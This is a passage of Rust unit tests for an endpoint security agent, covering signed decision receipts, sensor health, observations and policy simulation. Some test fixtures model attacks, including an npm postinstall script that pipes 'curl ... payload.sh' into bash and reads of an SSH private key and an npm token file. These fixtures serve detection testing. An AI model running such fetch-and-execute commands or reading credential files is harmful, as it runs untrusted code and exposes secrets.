            .contains("signer identity"));

        let mut missing_confidence = valid_detection_receipt(
            9,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        missing_confidence.decision.confidence = None;
        assert!(missing_confidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("confidence"));

        let mut missing_evidence = valid_detection_receipt(
            10,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        missing_evidence.evidence.clear();
        assert!(missing_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence"));

        let mut blank_evidence_key = valid_detection_receipt(
            11,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        blank_evidence_key.evidence[0].key.clear();
        assert!(blank_evidence_key
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence key"));

        let mut malformed_evidence_hash = valid_detection_receipt(
            12,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        malformed_evidence_hash.evidence[0].value_hash = "not-a-hash".to_string();
        assert!(malformed_evidence_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence value hash"));

        let mut duplicate_evidence_key = valid_detection_receipt(
            13,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        duplicate_evidence_key.evidence[1].key = duplicate_evidence_key.evidence[0].key.clone();
        assert!(duplicate_evidence_key
            .validate()
            .unwrap_err()
            .to_string()
            .contains("duplicate evidence key"));
    }

    #[test]
    fn endpoint_decision_receipt_rejects_signer_public_key_mismatch() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut event = observation(EndpointEvent::ProcessExec {
            image: "/Users/alice/Downloads/build-helper".to_string(),
            args: vec!["--postinstall".to_string()],
            env: BTreeMap::new(),
        });
        event.process.signing = CodeSignatureStatus {
            trust: SignatureTrust::Unsigned,
            notarized: Some(false),
            ..CodeSignatureStatus::default()
        };
        let finding = guard.evaluate(&event).into_iter().next().unwrap();
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let keypair = hush_core::Keypair::from_seed(&[9u8; 32]);
        let other = hush_core::Keypair::from_seed(&[10u8; 32]);
        let mut receipt = valid_detection_receipt(
            9,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );
        receipt.signer.signer_public_key = Some(other.public_key().to_hex());

        let err = receipt.sign_with(&keypair).unwrap_err();

        assert!(err.to_string().contains("public key"));
    }

    #[test]
    fn endpoint_decision_receipt_signing_embeds_signer_public_key_when_missing() {
        let guard = SupplyChainRuntimeGuard::new();
        let event = observation(EndpointEvent::PackageScript {
            manager: PackageManager::Npm,
            package: Some("leftpad-plus".to_string()),
            phase: "postinstall".to_string(),
            script: "curl https://example.invalid/payload.sh | bash -c".to_string(),
            working_directory: Some("/tmp/pkg".to_string()),
        });
        let finding = guard.evaluate(&event).into_iter().next().unwrap();
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let keypair = hush_core::Keypair::from_seed(&[12u8; 32]);
        let receipt = valid_detection_receipt(
            13,
            "endpoint-1",
            "local-agent:endpoint-1",
            &event,
            &finding,
            graph_recorder.graph(),
        );

        let signed = receipt.sign_with(&keypair).unwrap();
        let signer_public_key = signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .and_then(|endpoint| endpoint.get("signer"))
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str);

        assert_eq!(
            signer_public_key,
            Some(keypair.public_key().to_hex().as_str())
        );
    }

    #[test]
    fn endpoint_sensor_state_receipt_binds_provider_health() {
        let keypair = hush_core::Keypair::from_seed(&[14u8; 32]);
        let sensor_state = EndpointSensorState {
            providers: vec![
                EndpointProviderState {
                    provider_id: "agent-api".to_string(),
                    provider_kind: EndpointProviderKind::AgentApi,
                    installed: true,
                    active: true,
                    healthy: true,
                    degraded: false,
                    degradation_reasons: Vec::new(),
                    dropped_event_count: 0,
                    deadline_miss_count: 0,
                    full_disk_access: None,
                    last_seen: Some(Utc::now()),
                },
                EndpointProviderState {
                    provider_id: "macos.endpoint_security".to_string(),
                    provider_kind: EndpointProviderKind::EndpointSecurity,
                    installed: true,
                    active: false,
                    healthy: false,
                    degraded: true,
                    degradation_reasons: vec!["missing full disk access".to_string()],
                    dropped_event_count: 2,
                    deadline_miss_count: 1,
                    full_disk_access: Some(false),
                    last_seen: None,
                },
            ],
        };
        let mut receipt =
            EndpointDecisionReceipt::for_sensor_state(EndpointSensorStateReceiptInput {
                local_sequence: 13,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state,
                reason: "prove protection state",
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::SensorState
        );
        assert!(!receipt.decision.passed);
        assert_eq!(
            receipt.decision.rule_id.as_deref(),
            Some("endpoint.sensor_state")
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "degradedProviderCount"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "sensorStateHash"));

        let mut mismatched_provider_count = receipt.clone();
        if let Some(provider_count_evidence) = mismatched_provider_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "providerCount")
        {
            *provider_count_evidence = EndpointReceiptEvidence::hashed("providerCount", "1");
        }
        assert!(mismatched_provider_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state provider count evidence hash"));

        let mut mismatched_provider_ids = receipt.clone();
        if let Some(provider_ids_evidence) = mismatched_provider_ids
            .evidence
            .iter_mut()
            .find(|item| item.key == "providerIds")
        {
            *provider_ids_evidence = EndpointReceiptEvidence::hashed("providerIds", "agent-api");
        }
        assert!(mismatched_provider_ids
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state provider ids evidence hash"));

        let mut relabeled_provider_ids = receipt.clone();
        relabeled_provider_ids.sensor_state.providers[1].provider_id =
            "macos.endpoint_security.relabel".to_string();
        if let Some(provider_ids_evidence) = relabeled_provider_ids
            .evidence
            .iter_mut()
            .find(|item| item.key == "providerIds")
        {
            *provider_ids_evidence = EndpointReceiptEvidence::hashed(
                "providerIds",
                "agent-api,macos.endpoint_security.relabel",
            );
        }
        assert!(relabeled_provider_ids
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state id"));

        let mut relabeled_active_count = receipt.clone();
        relabeled_active_count.sensor_state.providers[1].active = true;
        relabeled_active_count.sensor_state.providers[1].last_seen =
            Some(receipt.clock.captured_at);
        if let Some(active_count_evidence) = relabeled_active_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "activeProviderCount")
        {
            *active_count_evidence = EndpointReceiptEvidence::hashed("activeProviderCount", "2");
        }
        assert!(relabeled_active_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state id"));

        let mut relabeled_sensor_state_hash = receipt.clone();
        relabeled_sensor_state_hash.sensor_state.providers[1].degradation_reasons =
            vec!["network extension offline".to_string()];
        let sensor_state_value = serde_json::to_value(&relabeled_sensor_state_hash.sensor_state)
            .unwrap_or_else(|err| panic!("failed to serialize relabeled sensor state: {err}"));
        let canonical_sensor_state = canonicalize_json(&sensor_state_value)
            .unwrap_or_else(|err| panic!("failed to canonicalize relabeled sensor state: {err}"));
        let sensor_state_hash = sha256(canonical_sensor_state.as_bytes()).to_hex_prefixed();
        if let Some(sensor_state_hash_evidence) = relabeled_sensor_state_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "sensorStateHash")
        {
            *sensor_state_hash_evidence =
                EndpointReceiptEvidence::hashed("sensorStateHash", sensor_state_hash);
        }
        assert!(relabeled_sensor_state_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("sensor state id"));

        let mut unmarked_degraded_provider = receipt.clone();
        unmarked_degraded_provider.sensor_state.providers[1].degraded = false;
        assert!(unmarked_degraded_provider
            .validate()
            .unwrap_err()
            .to_string()
            .contains("marked degraded"));

        let mut missing_active_last_seen = receipt.clone();
        missing_active_last_seen.sensor_state.providers[0].last_seen = None;
        assert!(missing_active_last_seen
            .validate()
            .unwrap_err()
            .to_string()
            .contains("last seen"));

        let mut future_active_last_seen = receipt.clone();
        future_active_last_seen.sensor_state.providers[0].last_seen =
            Some(receipt.clock.captured_at + chrono::Duration::seconds(5));
        assert!(future_active_last_seen
            .validate()
            .unwrap_err()
            .to_string()
            .contains("after receipt capture"));

        let mut missing_degraded_reason = receipt.clone();
        missing_degraded_reason.sensor_state.providers[1]
            .degradation_reasons
            .clear();
        assert!(missing_degraded_reason
            .validate()
            .unwrap_err()
            .to_string()
            .contains("degradation reason"));

        let mut blank_degraded_reason = receipt;
        blank_degraded_reason.sensor_state.providers[1].degradation_reasons =
            vec!["  ".to_string()];
        assert!(blank_degraded_reason
            .validate()
            .unwrap_err()
            .to_string()
            .contains("degradation reason"));
    }

    #[test]
    fn endpoint_sensor_state_receipt_rejects_duplicate_provider_ids() {
        let provider = EndpointProviderState {
            provider_id: "agent-api".to_string(),
            provider_kind: EndpointProviderKind::AgentApi,
            installed: true,
            active: true,
            healthy: true,
            degraded: false,
            degradation_reasons: Vec::new(),
            dropped_event_count: 0,
            deadline_miss_count: 0,
            full_disk_access: None,
            last_seen: Some(Utc::now()),
        };
        let mut receipt =
            EndpointDecisionReceipt::for_sensor_state(EndpointSensorStateReceiptInput {
                local_sequence: 16,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState {
                    providers: vec![provider.clone(), provider],
                },
                reason: "prove protection state",
            });
        receipt.signer.signer_public_key = Some(
            hush_core::Keypair::from_seed(&[16u8; 32])
                .public_key()
                .to_hex(),
        );

        assert!(receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("duplicate sensor provider id"));
    }

    #[test]
    fn endpoint_provider_degradation_receipt_requires_degraded_provider() {
        let keypair = hush_core::Keypair::from_seed(&[15u8; 32]);
        let provider = EndpointProviderState {
            provider_id: "macos.endpoint_security".to_string(),
            provider_kind: EndpointProviderKind::EndpointSecurity,
            installed: true,
            active: false,
            healthy: false,
            degraded: true,
            degradation_reasons: vec!["missing_full_disk_access".to_string()],
            dropped_event_count: 3,
            deadline_miss_count: 2,
            full_disk_access: Some(false),
            last_seen: Some(Utc::now()),
        };
        let sensor_state = EndpointSensorState {
            providers: vec![provider.clone()],
        };
        let mut receipt = EndpointDecisionReceipt::for_provider_degradation(
            EndpointProviderDegradationReceiptInput {
                local_sequence: 14,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state,
                provider: &provider,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ProviderDegradation
        );
        assert!(!receipt.decision.passed);
        assert!(receipt
            .decision
            .rule_id
            .as_deref()
            .unwrap_or_default()
            .contains("macos.endpoint_security"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "degradationReasons"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "fullDiskAccess"));

        let mut mismatched_provider_id = receipt.clone();
        if let Some(provider_id_evidence) = mismatched_provider_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "providerId")
        {
            *provider_id_evidence = EndpointReceiptEvidence::hashed("providerId", "agent-api");
        }
        assert!(mismatched_provider_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("provider degradation provider id evidence hash"));

        let mut missing_degradation_reasons = receipt.clone();
        missing_degradation_reasons
            .evidence
            .retain(|item| item.key != "degradationReasons");
        assert!(missing_degradation_reasons
            .validate()
            .unwrap_err()
            .to_string()
            .contains("provider degradation reasons evidence"));

        let mut mismatched_full_disk_access = receipt.clone();
        if let Some(full_disk_access_evidence) = mismatched_full_disk_access
            .evidence
            .iter_mut()
            .find(|item| item.key == "fullDiskAccess")
        {
            *full_disk_access_evidence = EndpointReceiptEvidence::hashed("fullDiskAccess", "true");
        }
        assert!(mismatched_full_disk_access
            .validate()
            .unwrap_err()
            .to_string()
            .contains("provider degradation full-disk-access evidence hash"));

        let mut relabeled_degradation_id = receipt.clone();
        relabeled_degradation_id.decision.finding_id =
            Some("provider_degradation:other".to_string());
        assert!(relabeled_degradation_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("provider degradation id"));

        let mut no_degraded_provider = receipt;
        let receipt_captured_at = no_degraded_provider.clock.captured_at;
        no_degraded_provider.sensor_state.providers[0] = EndpointProviderState {
            provider_id: "agent-api".to_string(),
            provider_kind: EndpointProviderKind::AgentApi,
            installed: true,
            active: true,
            healthy: true,
            degraded: false,
            degradation_reasons: Vec::new(),
            dropped_event_count: 0,
            deadline_miss_count: 0,
            full_disk_access: None,
            last_seen: Some(receipt_captured_at),
        };
        assert!(no_degraded_provider
            .validate()
            .unwrap_err()
            .to_string()
            .contains("degraded provider"));
    }

    #[test]
    fn endpoint_observation_receipt_binds_provider_graph_and_content_hash() {
        let keypair = hush_core::Keypair::from_seed(&[17u8; 32]);
        let observation = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.ssh/id_ed25519".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut recorder = CausalGraphRecorder::new();
        recorder.record_observation(&observation);
        let graph = recorder.into_graph();
        let sensor_state = EndpointSensorState {
            providers: vec![EndpointProviderState {
                provider_id: "macos.endpoint_security".to_string(),
                provider_kind: EndpointProviderKind::EndpointSecurity,
                installed: true,
                active: true,
                healthy: true,
                degraded: false,
                degradation_reasons: Vec::new(),
                dropped_event_count: 0,
                deadline_miss_count: 0,
                full_disk_access: Some(true),
                last_seen: Some(observation.timestamp),
            }],
        };
        let mut receipt =
            EndpointDecisionReceipt::for_observation(EndpointObservationReceiptInput {
                local_sequence: 15,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state,
                observation: &observation,
                graph: &graph,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::Observation
        );
        assert_eq!(
            receipt.decision.observation_id.as_deref(),
            Some(observation.observation_id.as_str())
        );
        assert_eq!(
            receipt.decision.rule_id.as_deref(),
            Some("endpoint.observation.file_access")
        );
        assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
        assert_eq!(
            receipt.sensor_state.providers[0].provider_id,
            "macos.endpoint_security"
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "observationHash"));

        let mut mismatched_observation_hash = receipt.clone();
        if let Some(observation_hash) = mismatched_observation_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "observationHash")
        {
            *observation_hash = EndpointReceiptEvidence::hashed("observationHash", "sha256:other");
        }
        assert!(mismatched_observation_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("observation receipt id"));

        let mut mismatched_provider_kind = receipt.clone();
        if let Some(provider_kind) = mismatched_provider_kind
            .evidence
            .iter_mut()
            .find(|item| item.key == "providerKind")
        {
            *provider_kind = EndpointReceiptEvidence::hashed("providerKind", "network_extension");
        }
        assert!(mismatched_provider_kind
            .validate()
            .unwrap_err()
            .to_string()
            .contains("provider kind evidence"));

        let mut wrong_action = receipt;
        wrong_action.decision.action = EndpointDecisionAction::Alert;
        assert!(wrong_action
            .validate()
            .unwrap_err()
            .to_string()
            .contains("action must be observe"));
    }

    #[test]
    fn endpoint_policy_simulation_scores_graph_breakage_and_signs_receipt() {
        let script_event = observation(EndpointEvent::PackageScript {
            manager: PackageManager::Npm,
            package: Some("left-pad".to_string()),
            phase: "postinstall".to_string(),
            script: "node ./postinstall.js".to_string(),
            working_directory: Some("/repo".to_string()),
        });
        let credential_event = EndpointObservation {
            observation_id: stable_id("test", ["obs", "credential-sim"]),
            event: EndpointEvent::CredentialAccess {
                kind: CredentialKind::PackageRegistryToken,
                path: Some("/Users/alice/.npmrc".to_string()),
                name: Some("npm-token".to_string()),
            },
            ..observation(EndpointEvent::CredentialAccess {
                kind: CredentialKind::PackageRegistryToken,
                path: Some("/Users/alice/.npmrc".to_string()),
                name: Some("npm-token".to_string()),
            })
        };
        let mut tool_event = observation(EndpointEvent::ToolCall {
            tool_name: "mcp.shell".to_string(),
            parameters: serde_json::json!({
                "command": "npm install"
            }),
        });
        tool_event.metadata.insert(
            "toolCallId".to_string(),
            serde_json::json!("tool-call-sim-1"),
        );
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&script_event);
        graph_recorder.record_observation(&credential_event);
        graph_recorder.record_observation(&tool_event);
        let process_node_id = script_event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 8)
            .unwrap();
        let simulation = EndpointPolicySimulationReport::for_rule(
            EndpointPolicySimulationRule {
                rule_id: "endpoint.policy.simulate.block_npm".to_string(),
                action: EndpointDecisionAction::Block,
                description: Some("block npm postinstall".to_string()),
            },
            &process_node_id,
            &subgraph,
        );

        assert!(simulation.would_block);
        assert!(simulation.developer_breakage_score >= 70);
        assert_eq!(simulation.affected_process_count, 1);
        assert!(simulation.affected_credential_count >= 1);
        assert!(simulation
            .affected_nodes
            .iter()
            .any(|node| node.kind == CausalNodeKind::PackageScript));
        assert!(simulation
            .affected_identities
            .iter()
            .any(|identity| identity.identity_kind == "user" && identity.value == "alice"));
        assert!(simulation
            .affected_identities
            .iter()
            .any(|identity| identity.identity_kind == "session" && identity.value == "session-1"));
        assert!(simulation.affected_tools.iter().any(|tool| {
            tool.tool_name == "mcp.shell" && tool.tool_call_id.as_deref() == Some("tool-call-sim-1")
        }));
        assert_unknown_field_rejected::<EndpointPolicySimulationRule>(
            serde_json::to_value(EndpointPolicySimulationRule {
                rule_id: "endpoint.policy.simulate.block_npm".to_string(),
                action: EndpointDecisionAction::Block,
                description: Some("block npm postinstall".to_string()),
            })
            .unwrap(),
            "shadowRuleMode",
        );
        assert_unknown_field_rejected::<EndpointPolicySimulationReport>(
            serde_json::to_value(&simulation).unwrap(),
            "shadowWouldBreak",
        );
        assert_unknown_field_rejected::<EndpointPolicySimulationAffectedNode>(
            serde_json::to_value(&simulation.affected_nodes[0]).unwrap(),
            "shadowBreakageReason",
        );
        assert_unknown_field_rejected::<EndpointPolicySimulationIdentityContext>(
            serde_json::to_value(&simulation.affected_identities[0]).unwrap(),
            "shadowIdentityValue",
        );
        assert_unknown_field_rejected::<EndpointPolicySimulationToolContext>(
            serde_json::to_value(&simulation.affected_tools[0]).unwrap(),
            "shadowToolCall",
        );

        let keypair = hush_core::Keypair::from_seed(&[12u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_simulation(EndpointSimulationReceiptInput {
            local_sequence: 11,
            endpoint_id: "endpoint-1",
            signer_identity: "local-edr:endpoint-1",
            policy: EndpointPolicySnapshot {
                policy_version: "test-policy@1".to_string(),
                policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                policy_epoch: 7,
            },
            sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
            simulation: &simulation,
            graph: &subgraph,
        });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::Simulation
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            Some(simulation.simulation_id.as_str())
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "contentHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "affectedIdentityContext"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "affectedToolContext"));

        let mut mismatched_simulation_id = receipt.clone();
        if let Some(simulation_id_evidence) = mismatched_simulation_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "simulationId")
        {
            *simulation_id_evidence =
                EndpointReceiptEvidence::hashed("simulationId", "policy_simulation:other");
        }
        assert!(mismatched_simulation_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation id evidence hash"));

        let mut relabeled_simulation_id = receipt.clone();
        relabeled_simulation_id.decision.finding_id = Some("policy_simulation:other".to_string());
        if let Some(simulation_id_evidence) = relabeled_simulation_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "simulationId")
        {
            *simulation_id_evidence =
                EndpointReceiptEvidence::hashed("simulationId", "policy_simulation:other");
        }
        assert!(relabeled_simulation_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation id"));

        let mut mismatched_root_node = receipt.clone();
        if let Some(root_node_evidence) = mismatched_root_node
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_node
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation root node evidence hash"));

        let mut mismatched_breakage_score = receipt.clone();
        if let Some(score_evidence) = mismatched_breakage_score
            .evidence
            .iter_mut()
            .find(|item| item.key == "developerBreakageScore")
        {
            *score_evidence = EndpointReceiptEvidence::hashed("developerBreakageScore", "0");
        }
        assert!(mismatched_breakage_score
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation breakage score evidence hash"));

        let mut missing_identity_context = receipt.clone();
        missing_identity_context
            .evidence
            .retain(|item| item.key != "affectedIdentityContext");
        assert!(missing_identity_context
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation affected identity context evidence"));

        let mut missing_tool_context = receipt.clone();
        missing_tool_context
            .evidence
            .retain(|item| item.key != "affectedToolContext");
        assert!(missing_tool_context
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation affected tool context evidence"));

        let mut mismatched_content_hash = receipt.clone();
        if let Some(content_hash_evidence) = mismatched_content_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "contentHash")
        {
            *content_hash_evidence = EndpointReceiptEvidence::hashed("contentHash", "sha256:other");
        }
        assert!(mismatched_content_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation content hash evidence hash"));

        let mut mismatched_root_reference = receipt.clone();
        mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
        if let Some(root_node_evidence) = mismatched_root_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation graph root reference"));

        let mut mismatched_graph_slice_reference = receipt.clone();
        mismatched_graph_slice_reference.graph.graph_slice_id =
            Some("graph_slice:other".to_string());
        if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation graph slice reference"));
    }

    #[test]
    fn endpoint_policy_event_replay_receipt_binds_stream_graph_reference() {
        let keypair = hush_core::Keypair::from_seed(&[47u8; 32]);
        let event_stream_hash = sha256(b"event-stream").to_hex_prefixed();
        let result_hash = sha256(b"replay-result").to_hex_prefixed();
        let policy = EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        };
        let replay_id = endpoint_policy_event_replay_id(EndpointPolicyEventReplayIdInput {
            policy_hash: policy.policy_hash.as_str(),
            policy_epoch: policy.policy_epoch,
            event_stream_hash: &event_stream_hash,
            result_hash: &result_hash,
            event_count: 3,
            allowed_count: 1,
            warn_count: 1,
            blocked_count: 1,
            track_posture: true,
        });
        let mut receipt = EndpointDecisionReceipt::for_policy_event_replay(
            EndpointPolicyEventReplayReceiptInput {
                local_sequence: 47,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy,
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                replay_id: replay_id.as_str(),
                event_stream_hash: &event_stream_hash,
                result_hash: &result_hash,
                event_count: 3,
                allowed_count: 1,
                warn_count: 1,
                blocked_count: 1,
                track_posture: true,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::Simulation
        );
        assert_eq!(
            receipt.decision.rule_id.as_deref(),
            Some("endpoint.policy_event_replay")
        );
        assert_eq!(
            receipt.graph.graph_slice_id.as_deref(),
            Some(replay_id.as_str())
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some("policy_event_stream")
        );

        let mut mismatched_graph_slice = receipt.clone();
        mismatched_graph_slice.graph.graph_slice_id = Some("policy_event_replay:other".to_string());
        assert!(mismatched_graph_slice
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay graph slice reference"));

        let mut relabeled_replay_id = receipt.clone();
        relabeled_replay_id.decision.finding_id = Some("policy_event_replay:other".to_string());
        relabeled_replay_id.graph.graph_slice_id = Some("policy_event_replay:other".to_string());
        if let Some(replay_id_evidence) = relabeled_replay_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "replayId")
        {
            *replay_id_evidence =
                EndpointReceiptEvidence::hashed("replayId", "policy_event_replay:other");
        }
        assert!(relabeled_replay_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay id"));

        let mut mismatched_stream_node = receipt.clone();
        mismatched_stream_node.graph.process_node_id = Some("node:process-other".to_string());
        assert!(mismatched_stream_node
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay stream node reference"));

        let mut missing_stream_graph_node = receipt.clone();
        missing_stream_graph_node.graph.node_ids.clear();
        assert!(missing_stream_graph_node
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay stream node reference"));

        let mut missing_result_hash = receipt.clone();
        missing_result_hash
            .evidence
            .retain(|item| item.key != "resultHash");
        assert!(missing_result_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay result hash evidence"));

        let mut non_boolean_posture = receipt.clone();
        if let Some(posture_evidence) = non_boolean_posture
            .evidence
            .iter_mut()
            .find(|item| item.key == "trackPosture")
        {
            *posture_evidence = EndpointReceiptEvidence::hashed("trackPosture", "maybe");
        }
        assert!(non_boolean_posture
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay posture evidence"));
    }

    #[test]
    fn endpoint_policy_event_impact_receipt_binds_stream_graph_reference() {
        let keypair = hush_core::Keypair::from_seed(&[48u8; 32]);
        let event_stream_hash = sha256(b"event-stream").to_hex_prefixed();
        let current_result_hash = sha256(b"current-result").to_hex_prefixed();
        let proposed_result_hash = sha256(b"proposed-result").to_hex_prefixed();
        let impact_hash = sha256(b"impact").to_hex_prefixed();
        let proposed_policy_hash = sha256(b"proposed-policy").to_hex_prefixed();
        let policy = EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        };
        let impact_id = endpoint_policy_event_impact_id(EndpointPolicyEventImpactIdInput {
            current_policy_hash: policy.policy_hash.as_str(),
            current_policy_epoch: policy.policy_epoch,
            proposed_policy_hash: &proposed_policy_hash,
            proposed_policy_epoch: 8,
            event_stream_hash: &event_stream_hash,
            current_result_hash: &current_result_hash,
            proposed_result_hash: &proposed_result_hash,
            impact_hash: &impact_hash,
            event_count: 3,
            changed_count: 2,
            allow_to_block_count: 1,
            track_posture: true,
        });
        let mut receipt = EndpointDecisionReceipt::for_policy_event_impact(
            EndpointPolicyEventImpactReceiptInput {
                local_sequence: 48,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy,
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                impact_id: impact_id.as_str(),
                event_stream_hash: &event_stream_hash,
                current_result_hash: &current_result_hash,
                proposed_result_hash: &proposed_result_hash,
                impact_hash: &impact_hash,
                proposed_policy_hash: &proposed_policy_hash,
                proposed_policy_epoch: 8,
